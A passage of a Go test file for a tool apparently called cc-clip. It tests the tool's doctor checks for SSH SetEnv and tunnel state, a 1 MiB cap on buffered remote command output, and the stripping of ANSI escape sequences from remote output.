		cmd = exec.Command("sh", "-c", "printf '%s\\n' \"$1\" >&2; exit \"$2\"", "sh", stderrBody, fmt.Sprint(code))
	}
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err == nil {
		t.Fatalf("helper command exited 0, want exit %d", code)
	}
	// Sanity: the exec path we picked is the one whose *exec.ExitError
	// leaves Stderr nil. If a future Go release changes that, the
	// regression guard in TestClassifyDoctorPeerNotFoundReadsSentinelFromProductionStderrPath
	// will catch it.
	return err, strings.TrimSpace(stdout.String()), stderr.String()
}

// TestCheckSetEnvAlignmentSkipsOnUnreadableConfig pins that a missing
// ~/.ssh/config (which is the default for users who never created one)
// does not fail the check, but DOES surface a passing advisory so the
// operator can see why the SetEnv-alignment check did not actually run
// and gets the exact manual line they would need to add. Silently
// returning nil here would hide the skip in `cc-clip doctor` output.
func TestCheckSetEnvAlignmentSkipsOnUnreadableConfig(t *testing.T) {
	old := readLocalSSHConfig
	t.Cleanup(func() { readLocalSSHConfig = old })
	readLocalSSHConfig = func() ([]byte, error) {
		return nil, fmt.Errorf("open: no such file or directory")
	}

	got := checkSetEnvAlignment("myserver", &peer.Registration{
		ReservedPort: 18340,
		StateDir:     "/tmp/peer-a",
	}, nil, nil)
	if got == nil {
		t.Fatal("expected advisory CheckResult on unreadable config, got nil")
	}
	if !got.OK {
		t.Fatalf("expected OK=true (advisory, not failure), got %#v", got)
	}
	if !strings.Contains(got.Message, "skipped") {
		t.Fatalf("expected message to explain skip, got %q", got.Message)
	}
	if !strings.Contains(got.Message, "SetEnv CC_CLIP_PORT=18340") {
		t.Fatalf("expected message to include manual SetEnv line, got %q", got.Message)
	}
}

func TestResolveDoctorStateDirPrefersManagedSetEnvWhenPeerLookupMisses(t *testing.T) {
	got := resolveDoctorStateDir(nil, map[string]string{
		"CC_CLIP_STATE_DIR": "/home/shared/.cache/cc-clip/peers/peer-a",
	})
	if got != "/home/shared/.cache/cc-clip/peers/peer-a" {
		t.Fatalf("state dir = %q, want managed SetEnv state dir", got)
	}
}

// TestCappedBufferTruncatesAtCap pins the P2-D 1 MiB cap on each of
// stdout/stderr captured by runRemoteSSHCommand. Without the cap, a
// runaway remote command could grow the in-process buffers without
// bound. The cap includes a stable marker so operators reading the
// truncated output can tell data was dropped.
func TestCappedBufferTruncatesAtCap(t *testing.T) {
	t.Run("under_cap_writes_verbatim", func(t *testing.T) {
		b := &cappedBuffer{cap: 16}
		n, err := b.Write([]byte("hello"))
		if err != nil || n != 5 {
			t.Fatalf("Write returned (%d, %v), want (5, nil)", n, err)
		}
		if got := b.String(); got != "hello" {
			t.Fatalf("String() = %q, want %q", got, "hello")
		}
	})

	t.Run("spanning_cap_truncates_and_appends_marker", func(t *testing.T) {
		b := &cappedBuffer{cap: 8}
		n, err := b.Write([]byte("hello world")) // 11 bytes, cap 8
		if err != nil || n != 11 {
			t.Fatalf("Write returned (%d, %v), want (11, nil)", n, err)
		}
		got := b.String()
		if !strings.HasPrefix(got, "hello wo") {
			t.Fatalf("String() = %q, want prefix %q", got, "hello wo")
		}
		if !strings.Contains(got, "output truncated") {
			t.Fatalf("String() = %q, missing truncation marker", got)
		}
	})

	t.Run("writes_after_cap_are_dropped_but_succeed", func(t *testing.T) {
		b := &cappedBuffer{cap: 4}
		// Fill past cap with first write.
		if _, err := b.Write([]byte("abcdefg")); err != nil {
			t.Fatalf("first Write: %v", err)
		}
		// Subsequent writes must not error (EPIPE on ssh's stdout would
		// make ssh exit nonzero even when the remote succeeded) and must
		// not re-append the marker.
		before := b.String()
		n, err := b.Write([]byte("XYZ"))
		if err != nil || n != 3 {
			t.Fatalf("second Write returned (%d, %v), want (3, nil)", n, err)
		}
		after := b.String()
		if strings.Count(after, "output truncated") != 1 {
			t.Fatalf("marker duplicated across writes: %q", after)
		}
		if after != before {
			t.Fatalf("post-cap bytes leaked: before=%q after=%q", before, after)
		}
	})
}

// TestCappedBufferSatisfiesIOWriter is a compile-time assertion that
// *cappedBuffer implements io.Writer. If a future refactor changes the
// signature in a way that breaks the exec.Cmd Stdout/Stderr assignment,
// this will surface at test compile time rather than runtime.
func TestCappedBufferSatisfiesIOWriter(t *testing.T) {
	var _ interface {
		Write(p []byte) (int, error)
	} = (*cappedBuffer)(nil)
	// Defense in depth: the concrete assignment used by runRemoteSSHCommand.
	var buf bytes.Buffer
	_ = buf // silence unused; keeps the import pinned alongside the cap test
}

// TestLookupPeerSanitizesRemoteOutputInErrorMessages pins the P2-B fix:
// when the remote returns an error with ANSI / control-character bytes
// in stdout (a compromised remote, a sandbox wrapper, etc.), the
// operator-facing error message must NOT contain the raw escape
// sequences — those would rewrite the operator's terminal view. The JSON
// parse path still sees raw stdout (keep the round-trip contract), but
// any bytes we splice into an error for human eyes go through
// sanitizeRemoteOutput first.
func TestSanitizeRemoteOutputStripsANSIEscape(t *testing.T) {
	// Sanity guard for the sanitizer itself — the P2-B fix only works
	// because this function actually strips CSI sequences.
	got := sanitizeRemoteOutput("\x1b[31mred\x1b[0m text")
	if strings.Contains(got, "\x1b") {
		t.Fatalf("sanitizeRemoteOutput leaked ESC: %q", got)
	}
	if !strings.Contains(got, "red") || !strings.Contains(got, "text") {
		t.Fatalf("sanitizeRemoteOutput dropped payload content: %q", got)
	}
}

func TestCheckTunnelStateAlignmentSkipsWithoutPeerReservationOrSavedState(t *testing.T) {
	oldLoad := loadTunnelStatesForHost
	t.Cleanup(func() { loadTunnelStatesForHost = oldLoad })

	loadTunnelStatesForHost = func(string) ([]*tunnel.TunnelState, error) {
		return nil, nil
	}

	got, state := checkTunnelStateAlignment("myserver", nil, 18339)
	if len(got) != 1 || !got[0].OK {
		t.Fatalf("expected tunnel-state check skip success, got %#v", got)
	}
	if got[0].Message != "peer SSH forwarding not configured; skipping local tunnel state check" {
		t.Fatalf("unexpected tunnel-state skip message: %#v", got)
	}
	if state != nil {
		t.Fatalf("state = %#v, want nil", state)
	}
}
